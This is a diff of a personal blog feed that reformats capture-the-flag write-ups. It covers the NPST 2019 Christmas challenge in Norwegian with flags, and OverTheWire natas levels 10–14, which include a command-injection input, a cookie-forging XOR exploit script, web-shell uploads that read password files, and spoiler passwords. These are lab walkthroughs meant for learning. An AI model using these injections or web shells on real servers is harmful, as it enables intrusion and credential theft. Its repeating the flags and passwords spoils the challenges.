-&lt;p&gt;&lt;strong&gt;Flagg: PST{fc35fdc70d5fc69d269883a822c7a53e}&lt;/strong&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{fc35fdc70d5fc69d269883a822c7a53e}&lt;/p&gt;
 
 &lt;h3 id=&quot;kildekode-15&quot;&gt;Kildekode (15)&lt;/h3&gt;
 &lt;p&gt;Joda, source koden til websiden inneholder en skjult tag:&lt;/p&gt;
@@ -2091,8 +2099,9 @@ Fra Keiserpingvinen
 Alt ligger i vedlagt bilde.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Flagget ligger bokstavelig talt i alt-tag til bildet.&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{f2e0e89f59722af1f388529720b9db03}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Flagget ligger bokstavelig talt i alt-tag til bildet.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{f2e0e89f59722af1f388529720b9db03}&lt;/p&gt;
 
 &lt;p&gt;Bildet er også av en gul lapp med teksten &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CO NG RA TS&lt;/code&gt;. I tillegg ser det ut til at det er noen spesielle kabler i bildet, 
 sannsynligvis &lt;a href=&quot;https://en.wikipedia.org/wiki/Enigma_machine&quot;&gt;ENIGMA&lt;/a&gt; kabler (du har vel sett &lt;a href=&quot;https://en.wikipedia.org/wiki/The_Imitation_Game&quot;&gt;The Imitation Game&lt;/a&gt;?).&lt;/p&gt;
@@ -2139,11 +2148,12 @@ Ved å kjøre litt nummeranalyse på disse bytes, kan jeg se at det er 888 bytes
 det ser ut til at tallene opptrer i grupper på 3 og 3. UTF-8/Unicode er det ikke, ei heller RGB. Ved å sjekke antall av unike grupper,
 kan jeg se at det er kun 4 unike grupperinger. Jeg forsøker base 4 på de tre første gruppene, og får PST som resultat. 
 Løsningen er altså base4 enkodet, erstattet med en gruppering på 3 bytes og printet ut.
-Ved å reversere dette finner vi det siste flagget.&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{67b8601a11e47a9ee3bf08ddfd0b79ba}&lt;/strong&gt;&lt;/p&gt;
+Ved å reversere dette finner vi det siste flagget.&lt;/p&gt;
 
-&lt;p&gt;Kode:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{67b8601a11e47a9ee3bf08ddfd0b79ba}&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;solver.py&quot;
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;numpy&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;
 
@@ -2277,9 +2287,9 @@ så jeg eksporterer i RAW format, og importerer dette til &lt;a href=&quot;https
 Her finner jeg egentlig ikke ut av så mye, men etter litt konferering med Roy Solberg, så var det en enklere måte
 å løse denne på, det er masse hint til finn, og PST hadde kun tre annonser ute denne dagen, så det var bare å prøve tittelen
 på alle tre, så kom man fram til riktig flagg.
-Jeg ser i etterkant at jeg var inne på den påtenkte løsningen, &lt;a href=&quot;https://github.com/myrdyr/ctf-writeups/tree/master/npst#fragmentert-samtale&quot;&gt;her er en beskrivelse&lt;/a&gt;.&lt;br /&gt;
-&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PST{0844d949169d24679a1f0438f89c69e3}&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+Jeg ser i etterkant at jeg var inne på den påtenkte løsningen, &lt;a href=&quot;https://github.com/myrdyr/ctf-writeups/tree/master/npst#fragmentert-samtale&quot;&gt;her er en beskrivelse&lt;/a&gt;.&lt;/p&gt;
 
+&lt;p class=&quot;note&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PST{0844d949169d24679a1f0438f89c69e3}&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id=&quot;mystisk-julekort-5&quot;&gt;Mystisk julekort (5)&lt;/h3&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Mystisk julekort
 
@@ -2367,15 +2377,19 @@ Klem inn denne verdien som cookie, og vi får et annet resultat.&lt;/p&gt;
 https://npst.no/_6331fff126233c324c9f5fc49c49a8b6.html
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;Flagg: PST{82a1f79e6ce39ef16d0ef4ef1c1d2fcc}&lt;/strong&gt;&lt;/p&gt;
-
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{82a1f79e6ce39ef16d0ef4ef1c1d2fcc}&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/2020-npst/24-final-scene.png&quot; alt=&quot;star wars&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;til-slutt&quot;&gt;Til slutt&lt;/h2&gt;
 &lt;p&gt;Jeg satt virkelig fast på noen oppgaver, og brukte Roy Solberg (&lt;a href=&quot;https://twitter.com/roysolberg&quot;&gt;Twitter&lt;/a&gt;, &lt;a href=&quot;https://blog.roysolberg.com/&quot;&gt;Blog&lt;/a&gt;) som en veldig kjekk “rubber duck” og hint master. 
 Uten hans hjelp hadde jeg nok ikke kommet videre på en del av oppgavene.&lt;/p&gt;
 
-&lt;p&gt;🙌🙌 Takk for at du tok deg tid til å lese alt, trykk på recommend og legg inn en kommentar! 🙌🙌&lt;/p&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduksjon Introduksjon Mot slutten av november i 2019 ble det sluppet en del stillingsannonser og artikler om NPST som utlyser en midlertidig stilling som snikende alvebetjent. Etter å ha gått igjennom en del av stillingsannonsene, Kunne man finne en faktisk link til starten av en veldig gøy CTF arrangert av PST. Man kunne nok ha gjettet seg fram til domenet også.</summary></entry><entry><title type="html">Adidas Smart Run</title><link href="https://fjank.no/blog/2019-11-18-adidas-smart-run/" rel="alternate" type="text/html" title="Adidas Smart Run" /><published>2019-11-18T00:00:00+01:00</published><updated>2021-04-11T12:54:10+02:00</updated><id>https://fjank.no/blog/adidas-smart-run</id><content type="html" xml:base="https://fjank.no/blog/2019-11-18-adidas-smart-run/">&lt;p&gt;&lt;img src=&quot;/assets/img/blog/adidas_smart_run_outside.jpg&quot; alt=&quot;Adidas smart run outside stylistic&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;🙌🙌 Takk for at du tok deg tid til å lese alt, trykk på recommend og legg inn en kommentar! 🙌🙌&lt;/p&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduksjon Introduksjon Mot slutten av november i 2019 ble det sluppet en del stillingsannonser og artikler om NPST som utlyser en midlertidig stilling som snikende alvebetjent. Etter å ha gått igjennom en del av stillingsannonsene, Kunne man finne en faktisk link til starten av en veldig gøy CTF arrangert av PST. Man kunne nok ha gjettet seg fram til domenet også.</summary></entry><entry><title type="html">Adidas Smart Run</title><link href="https://fjank.no/blog/2019-11-18-adidas-smart-run/" rel="alternate" type="text/html" title="Adidas Smart Run" /><published>2019-11-18T00:00:00+01:00</published><updated>2021-04-11T15:01:20+02:00</updated><id>https://fjank.no/blog/adidas-smart-run</id><content type="html" xml:base="https://fjank.no/blog/2019-11-18-adidas-smart-run/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduction&quot; id=&quot;markdown-toc-introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#strategy&quot; id=&quot;markdown-toc-strategy&quot;&gt;Strategy&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#information-gathering&quot; id=&quot;markdown-toc-information-gathering&quot;&gt;Information Gathering&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/adidas_smart_run_outside.jpg&quot; alt=&quot;Adidas smart run outside stylistic&quot; /&gt;&lt;/p&gt;
 &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;For a very good review of the watch and all it has to offer, check out &lt;a href=&quot;https://www.dcrainmaker.com/2013/12/adidas-smart-review.html&quot;&gt;DC Rainmakers blog entry&lt;/a&gt;.&lt;/p&gt;
 
@@ -2701,7 +2715,14 @@ Next post will be to look for easter-eggs/backdoors/dev-doors that is exposed vi
   &lt;li&gt;/system/xbin/scotest&lt;/li&gt;
   &lt;li&gt;/system/xbin/sdptest&lt;/li&gt;
   &lt;li&gt;/system/xbin/&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduction For a very good review of the watch and all it has to offer, check out DC Rainmakers blog entry.</summary></entry><entry><title type="html">OverTheWire natas 10 - 14</title><link href="https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/" rel="alternate" type="text/html" title="OverTheWire natas 10 - 14" /><published>2019-03-18T00:00:00+01:00</published><updated>2021-04-11T12:53:59+02:00</updated><id>https://fjank.no/blog/overthewire-natas-10-14</id><content type="html" xml:base="https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/">&lt;p&gt;&lt;a href=&quot;/blog/2019-03-17-overthewire-natas-5-9/&quot;&gt;Read Previous - OverTheWire level 5-9 walkthrough.&lt;/a&gt;&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduction Introduction For a very good review of the watch and all it has to offer, check out DC Rainmakers blog entry.</summary></entry><entry><title type="html">OverTheWire natas 10 - 14</title><link href="https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/" rel="alternate" type="text/html" title="OverTheWire natas 10 - 14" /><published>2019-03-18T00:00:00+01:00</published><updated>2021-04-11T15:01:20+02:00</updated><id>https://fjank.no/blog/overthewire-natas-10-14</id><content type="html" xml:base="https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduction&quot; id=&quot;markdown-toc-introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-10&quot; id=&quot;markdown-toc-level-10&quot;&gt;Level 10&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-11&quot; id=&quot;markdown-toc-level-11&quot;&gt;Level 11&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-12&quot; id=&quot;markdown-toc-level-12&quot;&gt;Level 12&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-13&quot; id=&quot;markdown-toc-level-13&quot;&gt;Level 13&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-14&quot; id=&quot;markdown-toc-level-14&quot;&gt;Level 14&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&quot;http://overthewire.org&quot;&gt;OverTheWire&lt;/a&gt; is a wargame site with several challenges.
 It contains several challenges with a nice increase in
@@ -2720,7 +2741,8 @@ programming experience.&lt;/p&gt;
 &lt;p&gt;We are on this level met with yet another search, with a hint that they filter certain characters. 
 This time also they have been kind enough to give us the server source code.
 &lt;img src=&quot;/assets/img/blog/natas/overthewire-natas-10-1.png&quot; alt=&quot;Natas 10 landing page&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;For&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reasons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;certain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;For&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reasons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;certain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nc&quot;&gt;Find&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;containing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;needle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Search&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
@@ -2748,8 +2770,9 @@ This time also they have been kind enough to give us the server source code.
 &lt;p&gt;Passthru is still used, as in natas9, and they filter against these characters: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;|&amp;amp;&lt;/code&gt;
 Well, we could just grep for an empty string in any file, and we will get the entire file. 
 Thus a search for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&quot; /etc/natas_webpass/natas11 #&lt;/code&gt; that contains no illegal characters will give us the password
-for natas11.&lt;br /&gt;
-&lt;em&gt;whitelist, not blacklist&lt;/em&gt;&lt;/p&gt;
+for natas11.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;whitelist, not blacklist&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
@@ -2759,7 +2782,8 @@ for natas11.&lt;br /&gt;
 &lt;p&gt;We are met with a hint “Cookies are protected with &lt;a href=&quot;https://en.wikipedia.org/wiki/XOR_cipher&quot;&gt;XOR encryption&lt;/a&gt;”, an input field prefilled with a &lt;a href=&quot;https://en.wikipedia.org/wiki/Web_colors&quot;&gt;hex triplet&lt;/a&gt;, a button, and the sourcecode.
 If we change the color, the background of that page changes the color. 
 &lt;img src=&quot;/assets/img/blog/natas/natas11-1.png&quot; alt=&quot;Natas 11 landing page&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;
 
 &lt;span class=&quot;nv&quot;&gt;$defaultdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;showpassword&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bgcolor&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#ffffff&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
@@ -2841,7 +2865,8 @@ Interesting enough, plaintext XORed with encrypted will result in the key.&lt;br
 We can use that last rule as our attack, as we know the plaintext, and we know the encrypted bytes (they are in the cookie).
 When we successfully have retrieved the key, its trivial the encrypt a new cookie, request the page and retrieve the password.
 I will do this programmatically with python, comments in the code explain what I do.&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;exploit.py&quot;
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib.parse&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
 
@@ -2870,7 +2895,8 @@ I will do this programmatically with python, comments in the code explain what I
 &lt;span class=&quot;n&quot;&gt;i2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;em&gt;Don’t use XOR for encryption. Ever.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Don’t use XOR for encryption. Ever.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
@@ -2879,7 +2905,8 @@ I will do this programmatically with python, comments in the code explain what I
 &lt;h2 id=&quot;level-12&quot;&gt;&lt;a href=&quot;http://natas12.natas.labs.overthewire.org/&quot;&gt;Level 12&lt;/a&gt;&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/natas/natas12-1.png&quot; alt=&quot;Natas 12 landing page&quot; /&gt;
 We are met with an image upload code, and yet again, source code.&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt; 
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt; 
 
 &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;genRandomString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -2964,8 +2991,9 @@ Content-Type: text/php
 (to make output easier to read), and you have a poor mans browser shell to the server.
 Retrieve the password for the next level by opening the url &lt;a href=&quot;view-source:http://natas12.natas.labs.overthewire.org/upload/p4kd1uhtkk.php?test=cat%20/etc/natas_webpass/natas13&quot;&gt;view-source:http://natas12.natas.labs.overthewire.org/upload/p4kd1uhtkk.php?test=cat%20/etc/natas_webpass/natas13&lt;/a&gt;
 ![natas12-2.png].
-Read more on this vulnerability (Unrestricted file upload) on &lt;a href=&quot;https://www.owasp.org/index.php/Unrestricted_File_Upload&quot;&gt;OWASP&lt;/a&gt;.
-&lt;em&gt;Make sure to restrict file upload&lt;/em&gt;&lt;/p&gt;
+Read more on this vulnerability (Unrestricted file upload) on &lt;a href=&quot;https://www.owasp.org/index.php/Unrestricted_File_Upload&quot;&gt;OWASP&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Make sure to restrict file upload&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
@@ -2974,7 +3002,8 @@ Read more on this vulnerability (Unrestricted file upload) on &lt;a href=&quot;h
 &lt;h2 id=&quot;level-13&quot;&gt;&lt;a href=&quot;http://natas13.natas.labs.overthewire.org/&quot;&gt;Level 13&lt;/a&gt;&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/natas/natas13-1.png&quot; alt=&quot;Natas 13 landing page&quot; /&gt;
 We are met with an image upload code again, this time with restrictions, and yet again, source code.&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;For&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reasons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;For&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reasons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;
 
 &lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt; 
 
@@ -3071,8 +3100,9 @@ GIF89a
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Resulting in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File uploaded successfully&lt;/code&gt; and a link to the file. Now its just a matter of opening the url, view source, 
 (to make output easier to read), and you have a poor mans browser shell to the server, just as natas12
-Retrieve the password for the next level by opening the url &lt;a href=&quot;view-source:http://natas13.natas.labs.overthewire.org/upload/7eifk4vmf9.php?test=cat%20/etc/natas_webpass/natas14&quot;&gt;view-source:http://natas13.natas.labs.overthewire.org/upload/7eifk4vmf9.php?test=cat%20/etc/natas_webpass/natas14&lt;/a&gt;
-&lt;em&gt;Checking file type is not enough&lt;/em&gt;&lt;/p&gt;
